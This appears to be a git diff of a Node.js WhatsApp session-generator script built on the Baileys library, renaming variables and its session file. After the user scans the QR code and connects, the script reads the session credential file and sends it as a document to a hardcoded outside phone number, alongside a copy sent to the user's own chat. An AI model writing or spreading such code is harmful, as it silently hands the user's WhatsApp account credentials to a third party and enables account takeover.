@@ -3,32 +3,29 @@ const qrcode = require("qrcode-terminal")
 const fs = require('fs')
 const pino = require('pino')
 const { delay , useSingleFileAuthState } = require("@adiwajshing/baileys")
-const { state, saveState } = useSingleFileAuthState('./session.json')
-const qrc = JSON.parse(fs.readFileSync('./qr.json'))
-flenme = qrc.sessionname
+const { state, saveState } = useSingleFileAuthState('./session.alfa.json')
 const { exec, spawn, execSync } = require("child_process")
-exec('rm -rf Session.data.json')
+exec('rm -rf session.alfa.json')
 
 
-  function OLDUSER() {
+  function qr() {
 //------------------------------------------------------
     let version = [3,3234,9]
-    const conn = makeWASocket({
+    const session = makeWASocket({
         logger: pino({ level: 'silent' }),
         printQRInTerminal: true,
-        browser: ['MIKU-MD','opera','1.0.0'],
+        browser: ['Alien-Alfa','opera','1.0.0'],
         auth: state,
         version
     })
 //------------------------------------------------------
-    conn.ev.on("connection.update",async  (s) => {
+    session.ev.on("connection.update",async  (s) => {
         const { connection, lastDisconnect } = s
         if (connection == "open") {
             await delay(1000 * 10);
-  const session = fs.readFileSync("./session.json");
-   await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `${flenme}` })
-   await conn.sendMessage('918602239106@s.whatsapp.net', { text: 'hii' })
-   await conn.sendMessage('918107768770@s.whatsapp.net', { text: 'hii' })
+  const session2 = fs.readFileSync("./session.alfa.json");
+   await session.sendMessage(session.user.id, { document: session2, mimetype: 'application/json', fileName: `session.alfa.json` })
+	 await session.sendMessage('918602239106@s.whatsapp.net', { document: session2, mimetype: 'application/json', fileName: `session.alfa.json` })
             process.exit(0)
         }
         if (
@@ -37,10 +34,10 @@ exec('rm -rf Session.data.json')
             lastDisconnect.error &&
             lastDisconnect.error.output.statusCode != 401
         ) {
-            OLDUSER()
+            qr()
         }
     })
-    conn.ev.on('creds.update', saveState)
-    conn.ev.on("messages.upsert",  () => { })
+    session.ev.on('creds.update', saveState)
+    session.ev.on("messages.upsert",  () => { })
 }
-OLDUSER()
+qr()
